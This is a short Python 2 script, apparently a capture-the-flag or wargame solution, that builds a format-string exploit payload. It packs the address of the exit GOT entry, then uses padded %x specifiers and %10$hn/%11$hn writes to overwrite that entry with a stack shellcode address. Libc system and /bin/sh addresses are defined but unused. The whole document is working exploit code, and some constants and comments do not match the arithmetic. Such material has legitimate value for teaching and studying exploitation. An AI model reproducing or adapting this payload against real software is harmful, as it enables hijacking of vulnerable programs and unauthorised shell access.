# coding: utf-8
import struct

SYSTEM = 0xf7e6aed0

BIN_SH = 0xf7f897ec

ADR_SHELLCODE = 0xffffd852

TO_GO_1 = 0xffff
TO_GO_2 = 0xd875

PART1 = 0xd852 - 0x8 #55405
PART2 = 0xffff - 0xd852 #10130

EXIT_PLT = 0x80497e0


exploit = ''
exploit = struct.pack("I", EXIT_PLT)
exploit += struct.pack("I", EXIT_PLT + 2)

exploit += "%.{}x".format(PART1)
exploit += "%10$hn"

exploit += "%.{}x".format(PART2)
exploit += "%11$hn"

print exploit